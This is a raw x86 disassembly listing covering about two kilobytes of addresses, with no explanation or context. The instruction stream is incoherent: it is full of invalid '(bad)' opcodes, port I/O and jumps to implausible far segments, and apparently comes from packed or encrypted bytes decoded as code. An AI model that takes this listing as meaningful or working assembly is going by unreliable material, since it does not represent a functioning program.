  42082b:	mov    dh,0x56
  42082d:	mov    ah,0x1
  42082f:	into   
  420830:	aas    
  420831:	cmp    ecx,DWORD PTR [edi]
  420833:	aaa    
  420834:	xchg   DWORD PTR [esi-0x1b],esp
  420837:	daa    
  420838:	je     0x420896
  42083a:	mov    ah,0xba
  42083c:	(bad)  [ebx-0x2ce259ec]
  420842:	push   cs
  420843:	dec    ecx
  420844:	xchg   BYTE PTR [ecx-0x29],dl
  420847:	in     eax,0xb5
  420849:	inc    edi
  42084a:	or     dh,bh
  42084c:	retf   0xb8cb
  42084f:	jecxz  0x4207e1
  420851:	sbb    DWORD PTR [eax-0x66],edi
  420854:	mov    BYTE PTR [edi-0x7f],ch
  420857:	xor    edi,DWORD PTR [eax+0x3de9c757]
  42085d:	mov    cl,0x10
  42085f:	inc    esp
  420860:	inc    eax
  420861:	(bad)  
  420862:	inc    ebx
  420863:	push   ecx
  420864:	xlat   BYTE PTR ds:[ebx]
  420865:	push   ecx
  420866:	xchg   edx,eax
  420867:	icebp  
  420868:	popa   
  420869:	retf   0xe630
  42086c:	(bad)  
  42086d:	lods   al,BYTE PTR ds:[esi]
  42086e:	lods   eax,DWORD PTR ds:[esi]
  42086f:	inc    eax
  420870:	rcr    DWORD PTR [ecx],0xd0
  420873:	out    dx,eax
  420874:	not    BYTE PTR [ecx+0x16]
  420877:	mov    cl,0xda
  420879:	mov    ebp,0xe70543f
  42087e:	cdq    
  42087f:	mov    bl,0xac
  420881:	mov    esi,0xa97fbf70
  420886:	add    esi,ebp
  420888:	jecxz  0x4208bf
  42088a:	shl    BYTE PTR [ecx-0x71],0x11
  42088e:	xor    esi,ebx
  420890:	ret    
  420891:	mov    edi,0x42ce6014
  420896:	clc    
  420897:	mov    ds:0xf7ec91f,eax
  42089c:	ins    BYTE PTR es:[edi],dx
  42089d:	mov    esi,0xfac1b88a
  4208a2:	aad    0xad
  4208a4:	in     al,dx
  4208a5:	add    ebp,edi
  4208a7:	xor    esi,DWORD PTR [esp+edi*2-0x13d08ef6]
  4208ae:	jl     0x4208ec
  4208b0:	jno    0x420849
  4208b2:	pop    edx
  4208b3:	jae    0x4208bb
  4208b5:	sbb    eax,0xea626370
  4208ba:	pop    esp
  4208bb:	test   al,0x18
  4208bd:	mov    edx,DWORD PTR [edx-0x45]
  4208c0:	push   ecx
  4208c1:	lea    edx,[ebx-0x7b]
  4208c4:	lock repz sub eax,0x4919c26c
  4208cb:	fisttp WORD PTR [esi]
  4208cd:	mov    WORD PTR ds:0x70626c7a,gs
  4208d3:	repz pop ebp
  4208d5:	into   
  4208d6:	lods   eax,DWORD PTR ds:[esi]
  4208d7:	add    eax,ebp
  4208d9:	inc    ebp
  4208da:	mov    bh,0x2c
  4208dc:	xor    DWORD PTR [ebp-0x4d],eax
  4208df:	fsub   DWORD PTR [edi+0x71]
  4208e2:	and    eax,0xc663f1e8
  4208e7:	leave  
  4208e8:	pop    ebp
  4208e9:	loopne 0x4208f2
  4208eb:	gs scas al,BYTE PTR es:[edi]
  4208ed:	jmp    0x5cf72ede
  4208f2:	shl    DWORD PTR [ebx+0x30],cl
  4208f5:	jmp    0x3238:0xea3332bd
  4208fc:	jne    0x420924
  4208fe:	push   ebp
  4208ff:	jle    0x4208ed
  420901:	mov    eax,0x86238fb9
  420907:	mov    ebx,0x8a2a4895
  42090c:	push   0xffffff80
  42090e:	fs dec esi
  420910:	sbb    BYTE PTR [ebx-0x19af98e2],cl
  420916:	aam    0xf1
  420918:	add    eax,0xcfe57275
  42091d:	sub    DWORD PTR [ebx-0x3b],edi
  420920:	mov    bh,0xf
  420922:	nop    DWORD PTR [edx+0x3a]
  420926:	pop    edi
  420927:	out    dx,eax
  420928:	adc    BYTE PTR [edi-0x63],bl
  42092b:	sbb    bl,BYTE PTR [edi+0x4acd41ac]
  420931:	xchg   esi,esp
  420933:	xor    al,0x33
  420935:	repnz scas eax,DWORD PTR es:[edi]
  420937:	leave  
  420938:	retf   
  420939:	mov    edi,0x3bbc8b05
  42093e:	nop
  42093f:	das    
  420940:	ins    BYTE PTR es:[edi],dx
  420941:	imul   esi,eax,0xacd6e31f
  420947:	xchg   DWORD PTR [esi],ebp
  420949:	pop    eax
  42094a:	pop    ebx
  42094b:	add    dh,BYTE PTR [ecx-0x677d6ebe]
  420951:	xor    al,0x2c
  420953:	sahf   
  420954:	into   
  420955:	fst    QWORD PTR [edx]
  420957:	lds    ecx,FWORD PTR [edx-0x2d]
  42095a:	mov    edx,0x91863b2e
  42095f:	xor    DWORD PTR [eax],esi
  420961:	(bad)  
  420962:	pop    ebp
  420963:	push   ebx
  420964:	adc    eax,0x35d69f06
  420969:	popa   
  42096a:	mov    ds:0x2de0a69d,eax
  42096f:	mov    edx,0x347b63f1
  420974:	out    dx,eax
  420975:	jge    0x4209cc
  420977:	pop    ebx
  420978:	jno    0x420945
  42097a:	jo     0x42094c
  42097c:	mov    es,WORD PTR [ebx-0x6837c2a2]
  420982:	sub    esi,esi
  420984:	jnp    0x42091a
  420986:	inc    edx
  420987:	pop    es
  420988:	clc    
  420989:	out    dx,eax
  42098a:	call   0x40fb03d8
  42098f:	or     DWORD PTR [edi],0x14bab128
  420995:	inc    ebp
  420996:	test   al,0xd9
  420998:	xchg   edx,eax
  420999:	mov    cl,0xd1
  42099b:	hlt    
  42099c:	nop
  42099d:	jne    0x4209e1
  42099f:	mov    BYTE PTR [ebp-0x25162aba],dl
  4209a5:	cdq    
  4209a6:	pop    ds
  4209a7:	inc    ecx
  4209a8:	ins    BYTE PTR es:[edi],dx
  4209a9:	je     0x420967
  4209ab:	rcl    al,0x9a
  4209ae:	lea    esi,[esi+0x54]
  4209b1:	das    
  4209b2:	xor    eax,0xdffccc98
  4209b7:	mov    bh,0x3d
  4209b9:	pop    eax
  4209ba:	jb     0x420997
  4209bc:	fs dec ecx
  4209be:	mov    eax,0xdcf7117c
  4209c3:	cwde   
  4209c4:	iret   
  4209c5:	push   eax
  4209c6:	aas    
  4209c7:	call   0x769e:0xfdf1ae27
  4209ce:	fstp   st(1)
  4209d1:	call   0x4ace:0xe71262d4
  4209d8:	cmp    al,0x20
  4209da:	mov    esp,0xc5fb4422
  4209df:	cli    
  4209e0:	and    bh,BYTE PTR [esi-0x670ea52d]
  4209e6:	mov    al,ds:0x3b19903c
  4209eb:	je     0x420999
  4209ed:	nop
  4209ee:	adc    ebp,esi
  4209f0:	xchg   esp,eax
  4209f1:	nop
  4209f2:	stc    
  4209f3:	push   esi
  4209f4:	enter  0x269d,0x6e
  4209f8:	jb     0x420a6e
  4209fa:	mov    bh,0x59
  4209fc:	lods   al,BYTE PTR ds:[esi]
  4209fd:	or     BYTE PTR [ecx+0x75c0e5bf],dh
  420a03:	test   BYTE PTR [edi+0x71],dl
  420a06:	or     ah,bh
  420a08:	mov    ebx,0xdae99d73
  420a0d:	call   DWORD PTR [ebx]
  420a0f:	cmp    DWORD PTR [ebp+edx*2-0x19],edi
  420a13:	mov    ch,0xc5
  420a15:	inc    esi
  420a16:	mov    eax,0x23294440
  420a1b:	push   es
  420a1c:	sahf   
  420a1d:	xor    eax,DWORD PTR [edx]
  420a1f:	cld    
  420a20:	ins    DWORD PTR es:[edi],dx
  420a21:	stos   BYTE PTR es:[edi],al
  420a22:	xchg   al,ah
  420a24:	(bad)
  420a27:	inc    ebx
  420a28:	and    ebx,edi
  420a2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a2b:	dec    edi
  420a2c:	pop    eax
  420a2d:	ret    0x48e0
  420a30:	daa    
  420a31:	fwait
  420a32:	cmp    DWORD PTR [eax-0x76e79e19],0xdcd4d6ee
  420a3c:	push   ss
  420a3d:	clc    
  420a3e:	test   DWORD PTR [ebp-0x56],esp
  420a41:	mov    dh,BYTE PTR [eax+edx*1]
  420a44:	mov    bh,0xbe
  420a46:	dec    eax
  420a47:	xchg   esi,eax
  420a48:	bound  ebp,QWORD PTR [esi-0x676423c]
  420a4e:	pop    edx
  420a4f:	cs vunpcklps ymm6,ymm6,ymm6
  420a54:	(bad)  
  420a55:	dec    DWORD PTR [ecx-0x75]
  420a58:	add    dl,BYTE PTR [edx+0x17]
  420a5b:	sub    ecx,DWORD PTR [ebp+0x7ece3565]
  420a61:	mov    WORD PTR [ecx],es
  420a63:	repz mov bh,0x7
  420a66:	dec    esp
  420a67:	mov    bh,0xb7
  420a69:	mov    cl,0x25
  420a6b:	in     al,0x82
  420a6d:	imul   edi,DWORD PTR [edi-0x1b],0xffffff8d
  420a71:	sbb    eax,0x3bc2c7c7
  420a76:	and    BYTE PTR [ecx],dh
  420a78:	jmp    0x420a4c
  420a7a:	inc    ecx
  420a7b:	xchg   edx,eax
  420a7c:	adc    esp,ebp
  420a7e:	xchg   ecx,eax
  420a7f:	pop    ecx
  420a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a81:	inc    eax
  420a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a83:	cmp    edi,DWORD PTR [ebx-0x3e80f0de]
  420a89:	sub    bh,dl
  420a8b:	add    ch,BYTE PTR [ecx-0x27fa3097]
  420a91:	jns    0x420a98
  420a93:	repnz lods eax,DWORD PTR ds:[esi]
  420a95:	or     edi,DWORD PTR [esp+edi*8-0x29]
  420a99:	fisubr WORD PTR [eax+0x2741212b]
  420a9f:	mov    ah,0x86
  420aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aa2:	cld    
  420aa3:	sub    bh,BYTE PTR [edx-0xa03c8a1]
  420aa9:	sub    eax,esp
  420aab:	sahf   
  420aac:	jp     0x420af5
  420aae:	and    DWORD PTR [eax+0x1d],esp
  420ab1:	mov    ah,0x7e
  420ab3:	adc    BYTE PTR [eax],cl
  420ab5:	fistp  QWORD PTR [edx]
  420ab7:	mov    ecx,0xd64ace45
  420abc:	mov    eax,ds:0x1b84d75c
  420ac1:	mov    gs,WORD PTR [ebx-0x5d]
  420ac4:	dec    esi
  420ac5:	cmp    eax,DWORD PTR [ebx]
  420ac7:	pop    esp
  420ac8:	pop    edi
  420ac9:	xchg   esp,eax
  420aca:	inc    eax
  420acb:	inc    eax
  420acc:	pop    ecx
  420acd:	jmp    0x45a23abb
  420ad2:	pop    ecx
  420ad3:	gs pop edi
  420ad5:	jge    0x420b04
  420ad7:	jno    0x420ac3
  420ad9:	rcr    BYTE PTR [esi],cl
  420adb:	jno    0x420aea
  420add:	loop   0x420aee
  420adf:	pop    edx
  420ae0:	inc    esi
  420ae1:	push   esp
  420ae2:	mov    eax,0xc9859307
  420ae7:	js     0x420af5
  420ae9:	jg     0x420b1e
  420aeb:	dec    esi
  420aec:	mov    dh,BYTE PTR [ecx+ebx*4-0x6b123a2e]
  420af3:	adc    BYTE PTR ds:0x32c7ba2e,bl
  420af9:	in     al,dx
  420afa:	(bad)  
  420afb:	adc    dh,al
  420afd:	xor    eax,0x7f3e42be
  420b02:	mov    al,ds:0x18131679
  420b07:	out    0x75,eax
  420b09:	imul   esp,edx,0xeb7d4c23
  420b0f:	inc    ecx
  420b10:	xlat   BYTE PTR ds:[ebx]
  420b11:	add    dh,ah
  420b13:	out    dx,eax
  420b14:	in     al,dx
  420b15:	popa   
  420b16:	push   ebp
  420b17:	mov    dl,0xdd
  420b19:	popf   
  420b1a:	mov    bh,0xbe
  420b1c:	sub    edx,DWORD PTR [ebx]
  420b1e:	loopne 0x420b44
  420b20:	mov    bl,0xf2
  420b22:	push   ebx
  420b23:	rol    WORD PTR [eax-0x60],1
  420b27:	mul    BYTE PTR [ebx-0x367e1744]
  420b2d:	jns    0x420ac5
  420b2f:	mov    ch,0xb5
  420b31:	(bad)
  420b34:	in     eax,dx
  420b35:	out    0x57,al
  420b37:	mov    bl,0xeb
  420b39:	cmc    
  420b3a:	imul   ebx,DWORD PTR [eax+0x58],0xc60ce120
  420b41:	or     al,0x84
  420b43:	addr16 push 0xffffffe1
  420b46:	or     BYTE PTR [ebx-0x313e9988],0xdc
  420b4d:	addr16 mov dl,0x87
  420b50:	inc    eax
  420b51:	data16 mov dl,0xe1
  420b54:	je     0x420bc0
  420b56:	test   eax,0xfda2f866
  420b5b:	mov    esp,0x1930235c
  420b60:	lods   al,BYTE PTR ds:[esi]
  420b61:	jp     0x420bc5
  420b63:	js     0x420baf
  420b65:	fiadd  WORD PTR [esi-0x1]
  420b68:	push   0x6
  420b6a:	lods   al,BYTE PTR ds:[esi]
  420b6b:	inc    ebx
  420b6c:	lds    esi,FWORD PTR [eax]
  420b6e:	jnp    0x420b4e
  420b70:	or     ebp,esp
  420b72:	and    dh,BYTE PTR [edi]
  420b74:	aad    0x33
  420b76:	xor    al,BYTE PTR [ebx-0x4cd062a3]
  420b7c:	test   BYTE PTR [esi+0x6ec32505],bh
  420b82:	push   ecx
  420b83:	ins    BYTE PTR es:[edi],dx
  420b84:	int3   
  420b85:	sbb    eax,DWORD PTR [edi+ecx*8]
  420b88:	aam    0xf9
  420b8a:	in     eax,0xb
  420b8c:	out    dx,al
  420b8d:	add    al,0xff
  420b8f:	mov    WORD PTR [ebp-0x40],ss
  420b92:	rcr    DWORD PTR [esi+eax*8+0x3e],cl
  420b96:	(bad)  
  420b98:	push   ds
  420b99:	ja     0x420bf2
  420b9b:	aad    0xe5
  420b9d:	lahf   
  420b9e:	mov    ah,0x49
  420ba0:	retf   0xd7fa
  420ba3:	adc    BYTE PTR [esi],al
  420ba5:	dec    ecx
  420ba6:	mov    eax,0x4fd99598
  420bab:	(bad)  
  420bad:	enter  0xaa63,0x7e
  420bb1:	mov    BYTE PTR [ebp-0x20873e91],bh
  420bb7:	daa    
  420bb8:	jb     0x420c34
  420bba:	data16 out dx,al
  420bbc:	mov    ebp,0x79fc5682
  420bc1:	lahf   
  420bc2:	inc    ebx
  420bc3:	in     al,dx
  420bc4:	iret   
  420bc5:	add    al,0xcb
  420bc7:	ins    BYTE PTR es:[edi],dx
  420bc8:	xor    BYTE PTR [eax+0x79f8cab8],0xea
  420bcf:	add    al,0x4f
  420bd1:	inc    ecx
  420bd2:	jp     0x420bb5
  420bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bd5:	das    
  420bd6:	sub    DWORD PTR [bx+di+0x1e65],0xbc8be79f
  420bdf:	mov    al,ds:0xbb6807b
  420be4:	jae    0x420bc6
  420be6:	or     BYTE PTR [esi-0x1b],bh
  420be9:	inc    ebp
  420bea:	(bad)  
  420beb:	int    0x37
  420bed:	(bad)  
  420bee:	imul   ebp,ebp,0x44ca0cd4
  420bf4:	push   es
  420bf5:	jns    0x420bee
  420bf7:	in     al,0xec
  420bf9:	sbb    eax,0x291ed133
  420bfe:	jb     0x420c00
  420c00:	repnz or eax,DWORD PTR [ebx]
  420c03:	daa    
  420c04:	jmp    0xf36b2aea
  420c09:	(bad)  
  420c0a:	adc    DWORD PTR [ebx],ebx
  420c0c:	leave  
  420c0d:	xor    eax,0x3973442b
  420c12:	mov    ebx,0xa05b5b5c
  420c17:	pop    es
  420c18:	dec    esi
  420c19:	imul   esp,ecx,0xffffff88
  420c1c:	pusha  
  420c1d:	mov    cl,0x7b
  420c1f:	mov    ecx,0xdf5ae92
  420c24:	push   ebp
  420c25:	fs mov dh,0x3e
  420c28:	shl    BYTE PTR [esi-0x23],1
  420c2b:	xchg   esi,eax
  420c2c:	cmp    eax,0xa1dc4ae4
  420c31:	gs shl ecx,cl
  420c34:	dec    ebx
  420c35:	and    eax,0x1ea6b4de
  420c3a:	inc    ecx
  420c3b:	push   es
  420c3c:	retf   
  420c3d:	add    al,0xd4
  420c3f:	or     BYTE PTR [eax-0x74],dl
  420c42:	dec    eax
  420c43:	push   0xa9427ee1
  420c48:	fisttp WORD PTR ds:0xd6e291f9
  420c4e:	addr16 dec edi
  420c50:	pushf  
  420c51:	shl    cl,1
  420c53:	mov    edx,ebp
  420c55:	pop    ecx
  420c56:	pop    ss
  420c57:	push   ebp
  420c58:	jp     0x420bed
  420c5a:	addr16 pop es
  420c5c:	daa    
  420c5d:	add    bl,dh
  420c5f:	sub    BYTE PTR [edx-0x22],dl
  420c62:	das    
  420c63:	sahf   
  420c64:	xor    ebp,DWORD PTR [edi-0x1fba73e]
  420c6a:	mov    al,0xd3
  420c6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c6d:	int    0x87
  420c6f:	(bad)  
  420c70:	scas   al,BYTE PTR es:[edi]
  420c71:	rcr    esp,0xf9
  420c74:	xchg   edx,eax
  420c75:	js     0x420cbe
  420c77:	inc    esp
  420c78:	inc    esp
  420c79:	aaa    
  420c7a:	inc    edi
  420c7b:	sbb    DWORD PTR [eax],esi
  420c7d:	aam    0xa5
  420c7f:	ss mov fs,edx
  420c82:	ss inc ebp
  420c84:	scas   eax,DWORD PTR es:[edi]
  420c85:	scas   eax,DWORD PTR es:[edi]
  420c86:	fimul  WORD PTR [eax+0x4d]
  420c89:	in     eax,dx
  420c8a:	dec    ebp
  420c8b:	rcr    BYTE PTR [eax+0x6f],cl
  420c8e:	pop    ss
  420c8f:	mov    ebx,0x74804304
  420c94:	mov    esp,0x7958
	...
  420d11:	add    BYTE PTR [eax],al
  420d13:	add    bl,ah
  420d15:	push   es
  420d16:	add    DWORD PTR [edi-0x1b],esi
  420d19:	ja     0x420d12
  420d1b:	xchg   esi,eax
  420d1c:	popf   
  420d1d:	mov    edx,0x26e4c648
  420d22:	cli    
  420d23:	out    0x22,al
  420d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d26:	add    DWORD PTR [eax],eax
  420d28:	imul   eax,DWORD PTR [edi],0x0
  420d2b:	add    BYTE PTR [eax-0x281f9ea],bl
  420d31:	mov    al,ds:0x81fd4ba6
  420d36:	fbld   TBYTE PTR [ecx]
  420d38:	xchg   ecx,eax
  420d39:	add    al,0x49
  420d3b:	retf   0x2075
  420d3e:	inc    eax
  420d3f:	fistp  WORD PTR [esi+0x46]
  420d42:	xchg   esp,eax
  420d43:	ret    0x3741
  420d46:	xor    eax,0x5c3c51f7
  420d4b:	mov    eax,0x844ad800
  420d50:	retf   0xac77
  420d53:	jns    0x420d24
  420d55:	cmp    BYTE PTR [edx+0x33cc65dd],dl
  420d5b:	jmp    0x420d61
  420d5d:	(bad)  [esi+edi*2-0x5095833e]
  420d64:	fldcw  WORD PTR [edx-0x3653bf69]
  420d6a:	or     ah,ch
  420d6c:	(bad)  
  420d6d:	in     eax,dx
  420d6e:	mov    bl,BYTE PTR [ecx]
  420d70:	iret   
  420d71:	popf   
  420d72:	adc    dh,BYTE PTR [edi]
  420d74:	push   esi
  420d75:	push   edi
  420d76:	add    bh,BYTE PTR [edx-0x9686906]
  420d7c:	call   0x3925:0xaf801782
  420d83:	retf   0x1aa2
  420d86:	sub    eax,0x6593637a
  420d8b:	int    0xfc
  420d8d:	inc    esp
  420d8e:	xchg   ebp,eax
  420d8f:	pop    ebx
  420d90:	add    edx,edx
  420d92:	inc    esi
  420d93:	mov    eax,0x64be32a6
  420d98:	fadd   QWORD PTR [edi+0x7e933d10]
  420d9e:	(bad)  
  420d9f:	out    dx,al
  420da0:	iret   
  420da1:	inc    esi
  420da2:	mov    esp,0xbed27265
  420da7:	out    0x89,al
  420da9:	push   esi
  420daa:	adc    eax,ecx
  420dac:	pop    esp
  420dad:	stc    
  420dae:	daa    
  420daf:	mov    WORD PTR [esi-0x1f3a5f0f],gs
  420db5:	cli    
  420db6:	enter  0x72dd,0xbd
  420dba:	(bad)  
  420dbb:	jmp    0x420daa
  420dbd:	repnz es aad 0x6a
  420dc1:	xchg   ebx,eax
  420dc2:	push   0x9eda6988
  420dc7:	push   edi
  420dc8:	jecxz  0x420e48
  420dca:	xchg   esp,eax
  420dcb:	xchg   esp,eax
  420dcc:	xchg   edx,eax
  420dce:	cmp    eax,0x3ed7eaf8
  420dd3:	sbb    al,0x74
  420dd5:	pop    es
  420dd6:	cld    
  420dd7:	iret   
  420dd8:	mov    ecx,0x7cc56506
  420ddd:	enter  0x8f2,0xa6
  420de1:	(bad)  [ebp+0x1790bdbe]
  420de7:	sub    edi,DWORD PTR [esi-0x27]
  420dea:	fdivrp st(5),st
  420dec:	dec    ebx
  420ded:	pop    ecx
  420dee:	xor    eax,0x1f2d16bd
  420df3:	pop    edx
  420df4:	push   edx
  420df5:	std    
  420df6:	(bad)  
  420df7:	int3   
  420df8:	jle    0x420d7e
  420dfa:	(bad)  
  420dfb:	pusha  
  420dfc:	das    
  420dfd:	and    al,0x2b
  420dff:	jg     0x420dcd
  420e01:	dec    edi
  420e02:	in     al,dx
  420e03:	ins    BYTE PTR es:[edi],dx
  420e04:	aam    0x44
  420e06:	push   edi
  420e07:	and    ebp,esp
  420e09:	add    ah,BYTE PTR [ecx]
  420e0b:	push   edi
  420e0c:	mov    ds:0x1e7720fe,eax
  420e11:	or     DWORD PTR ds:0xc32fcc5,0xa2c4cf16
  420e1b:	test   DWORD PTR [ebx],edx
  420e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e1e:	sbb    eax,0x5ef8d1b0
  420e23:	setl   BYTE PTR [esi+0x3]
  420e27:	add    DWORD PTR [ecx-0xeab6594],0x4f
  420e2e:	maxps  xmm1,XMMWORD PTR [esi+eiz*2]
  420e32:	jecxz  0x420e38
  420e34:	mov    ebp,0xcc6d32ee
  420e39:	addr16 sub al,0xcc
  420e3c:	add    eax,0x7209344a
  420e41:	imul   edx,DWORD PTR [edx-0xbb0eaeb],0xb0b9aa14
  420e4b:	mov    al,0xcf
  420e4d:	pop    ecx
  420e4e:	je     0x420e4a
  420e50:	pop    ds
  420e51:	or     cl,BYTE PTR [ecx+0x42]
  420e54:	jp     0x420e43
  420e56:	jno    0x420dee
  420e58:	push   esi
  420e59:	add    DWORD PTR [ecx+0x7a0a8803],0xfffffffa
  420e60:	int    0x72
  420e62:	div    eax
  420e64:	jp     0x420e33
  420e66:	push   es
  420e67:	dec    ecx
  420e68:	call   0x421a:0x3469c6b2
  420e6f:	jbe    0x420e21
  420e71:	pop    ebp
  420e72:	xor    BYTE PTR [ebx-0x49],dl
  420e75:	jmp    0x420e93
  420e77:	or     BYTE PTR [ecx-0x16e8474e],dh
  420e7d:	mov    dh,0x6
  420e7f:	xchg   edx,eax
  420e80:	das    
  420e81:	stc    
  420e82:	mov    ch,0x7f
  420e84:	daa    
  420e85:	loop   0x420eca
  420e87:	add    al,0x86
  420e89:	fcomip st,st(6)
  420e8b:	jge    0x420e69
  420e8d:	push   esi
  420e8e:	mov    ah,0x5
  420e90:	xor    eax,0xc01e9276
  420e95:	inc    esp
  420e96:	mov    ds,edi
  420e98:	div    BYTE PTR [edx+ecx*1-0x57aed916]
  420e9f:	pop    edi
  420ea0:	inc    esp
  420ea1:	adc    eax,0x73e1d88b
  420ea6:	xchg   edx,eax
  420ea7:	xor    bl,ch
  420ea9:	test   eax,0x1737742d
  420eae:	fistp  QWORD PTR [edi+0x25]
  420eb1:	out    0xb,eax
  420eb3:	sbb    bh,ch
  420eb5:	aad    0x16
  420eb7:	push   ebx
  420eb8:	rcr    bl,1
  420eba:	xchg   edi,eax
  420ebb:	jle    0x420f25
  420ebd:	sbb    al,BYTE PTR [ebx+0x13]
  420ec0:	dec    edi
  420ec1:	pop    ebp
  420ec2:	add    DWORD PTR [eax+ecx*1],0x24
  420ec6:	hlt    
  420ec7:	jo     0x420f3e
  420ec9:	fiadd  DWORD PTR [eax+0x69]
  420ecc:	les    ecx,FWORD PTR [edx]
  420ece:	scas   eax,DWORD PTR es:[edi]
  420ecf:	and    DWORD PTR [edi+ebp*4+0x7c],edx
  420ed3:	stos   BYTE PTR es:[edi],al
  420ed4:	xchg   al,bl
  420ed6:	cld    
  420ed7:	sahf   
  420ed8:	sbb    ebp,esi
  420eda:	bound  edx,QWORD PTR [ebx]
  420edc:	adc    edi,DWORD PTR [eax-0x70]
  420edf:	les    ebp,FWORD PTR [edi-0x7e]
  420ee2:	dec    edx
  420ee3:	ins    BYTE PTR es:[edi],dx
  420ee4:	loopne 0x420e8b
  420ee6:	inc    ecx
  420ee7:	jmp    0x420e8f
  420ee9:	mov    ds:0x1823133b,al
  420eee:	clc    
  420eef:	mov    DWORD PTR ds:0xf51345de,edx
  420ef5:	mov    al,0xc3
  420ef7:	jmp    0x420f4f
  420ef9:	sub    ecx,edi
  420efb:	xor    DWORD PTR [ebx-0x3b9dea32],edx
  420f01:	cli    
  420f02:	fiadd  DWORD PTR [ecx+edi*8-0x6a]
  420f06:	jo     0x420f69
  420f08:	push   ds
  420f09:	(bad)
  420f0e:	mov    DWORD PTR [eax],ecx
  420f10:	stc    
  420f11:	push   esi
  420f12:	fwait
  420f13:	popf   
  420f14:	cmp    al,0x86
  420f16:	test   ah,bl
  420f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f19:	sti    
  420f1a:	in     eax,dx
  420f1b:	pusha  
  420f1c:	inc    ecx
  420f1d:	inc    eax
  420f1e:	pop    ss
  420f1f:	pop    es
  420f20:	repz ret 
  420f22:	(bad)  
  420f23:	and    al,dh
  420f25:	in     al,0xb0
  420f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f28:	hlt    
  420f29:	pop    ebp
  420f2a:	push   0x34
  420f2c:	mov    BYTE PTR [eax+0x41],dh
  420f2f:	cmp    bh,BYTE PTR ds:0x1f5fd0f2
  420f35:	jecxz  0x420f0a
  420f37:	dec    DWORD PTR [ecx]
  420f39:	shr    BYTE PTR [ecx],1
  420f3b:	inc    ebp
  420f3c:	mov    edi,0x904b956a
  420f41:	loopne 0x420f1d
  420f43:	and    edi,eax
  420f45:	jb     0x420fb9
  420f47:	call   0xbd88:0x4e662f8
  420f4e:	les    esi,FWORD PTR [eax-0x367e2047]
  420f54:	xchg   esp,eax
  420f55:	mov    eax,0xc1587bad
  420f5a:	fnstsw WORD PTR [eiz*2-0x4682cfcc]
  420f61:	and    BYTE PTR [ecx],dl
  420f63:	pop    esp
  420f64:	dec    esi
  420f65:	ret    
  420f66:	inc    ebx
  420f67:	sbb    DWORD PTR ds:0xc7417a3e,0x67
  420f6e:	mov    al,0x6d
  420f70:	les    edx,FWORD PTR [edi+esi*4+0x7c294e7e]
  420f77:	xchg   edx,eax
  420f78:	xchg   edi,eax
  420f79:	fstp   TBYTE PTR [esi-0x13]
  420f7c:	and    BYTE PTR [esi+0xa],cl
  420f7f:	xchg   esi,eax
  420f80:	mov    bh,0x2b
  420f82:	shr    ebx,cl
  420f84:	dec    ebx
  420f85:	fimul  WORD PTR [eax-0x4e5804d]
  420f8b:	and    ecx,0xa5c845c1
  420f91:	mov    WORD PTR [esi+0x33],ss
  420f94:	je     0x421004
  420f96:	jnp    0x420f21
  420f98:	and    edi,DWORD PTR [eax-0x74383220]
  420f9e:	bound  ebx,QWORD PTR ds:0xf924686b
  420fa4:	retf   
  420fa5:	sti    
  420fa6:	mov    ch,0x68
  420fa8:	imul   esi,DWORD PTR [ebx-0x2e863c79],0xa37ac842
  420fb2:	xor    edi,edi
  420fb4:	mov    dh,BYTE PTR [edx+edi*8-0x3373707e]
  420fbb:	(bad)  
  420fbc:	retf   0x7eb5
  420fbf:	sub    esp,ebx
  420fc1:	mov    ebx,0xfe6a0ece
  420fc6:	dec    ecx
  420fc7:	sbb    eax,0xf703810b
  420fcc:	or     BYTE PTR [ebx],bh
  420fce:	icebp  
  420fcf:	push   0x577920a6
  420fd4:	inc    esp
  420fd5:	es mov ecx,0xba462ace
  420fdb:	mov    ch,0x4e
  420fdd:	and    DWORD PTR [edi+0x64],edx
  420fe0:	sub    eax,0x7034571a
  420fe5:	bound  esi,QWORD PTR [esi]
  420fe7:	mov    edx,0xb2fed4dc
  420fec:	push   ds
  420fed:	pop    ebp
  420fee:	gs adc dh,ah
  420ff1:	mov    eax,0x5c9031e0
  420ff6:	pushf  
  420ff7:	xor    esp,edi
  420ff9:	test   BYTE PTR [ebx],0x45
  420ffc:	jmp    0x420fb9
  420ffe:	adc    DWORD PTR [ecx],0xfffffffc
  421001:	adc    edx,DWORD PTR [ebx+eiz*2]
  421004:	ret    0x42ba
  421007:	push   ds
  421008:	jno    0x421020
  42100a:	fisub  DWORD PTR [eax-0x700a9c59]
  421010:	add    al,0x84
  421012:	int3   
  421013:	xchg   edx,eax
  421014:	iret   
  421015:	adc    bh,bh
  421017:	mov    ch,ah
  421019:	jns    0x42101f
  42101b:	mov    ds,ebp
  42101d:	jge    0x420fc8
  42101f:	loope  0x421034
  421021:	lea    ebp,[esi+0x78]
  421024:	add    eax,0x3aeb047e
  421029:	jne    0x421026
  42102b:	pop    ecx
  42102c:	jle    0x4210a9
  42102e:	js     0x42104e
  421030:	shl    DWORD PTR [edx+0x1b2fab44],0x88
  421037:	repnz test BYTE PTR [eax],cl
  42103a:	hlt    
  42103b:	jns    0x421099
  42103d:	push   esi
  42103e:	cmp    eax,0xda7af874
  421043:	push   eax
  421044:	popa   
  421045:	sbb    dh,cl
  421047:	push   esp
  421048:	xor    eax,0xfb06d6e9
  42104d:	push   esi
  42104e:	psubb  mm7,mm7
  421051:	sub    eax,0xaef595f
  421056:	daa    
  421057:	or     eax,DWORD PTR [edx]
  421059:	xor    al,0x71
  42105b:	pop    ecx
  42105c:	arpl   cx,cx
  42105e:	shr    DWORD PTR [edi+0x52cb7e6a],cl
  421064:	cmp    BYTE PTR [esi-0xffa08c8],0xb8
  42106b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42106c:	mov    cl,0x10
  42106e:	cld    
  42106f:	mov    ecx,DWORD PTR [eax-0x3c]
  421072:	push   eax
  421073:	out    0xcb,eax
  421075:	imul   ebx,edx,0x528a92c7
  42107b:	inc    edi
